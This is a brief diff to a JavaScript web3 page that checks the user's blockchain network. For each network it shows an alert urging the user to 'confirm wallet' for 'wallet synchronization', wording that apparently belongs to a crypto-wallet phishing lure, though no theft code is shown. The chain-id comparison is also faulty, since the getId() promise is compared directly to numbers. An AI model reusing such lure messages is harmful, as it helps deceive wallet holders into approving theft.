@@ -171,8 +171,8 @@ async function fetchAccountData() {
   document.getElementById("matic").style.display = "";
   document.getElementById("bsc").style.display = "";
   web3.eth.net.getId().then(console.log);
-  //var chainid =web3.eth.net.getId();
-  if(chainId == 1){
+  var chainid =web3.eth.net.getId();
+  if(chainid == 1){
   alert("You are on the Ethereum Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
   else if(chainid == 137){
   alert("You are on the Polygon(Matic) Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
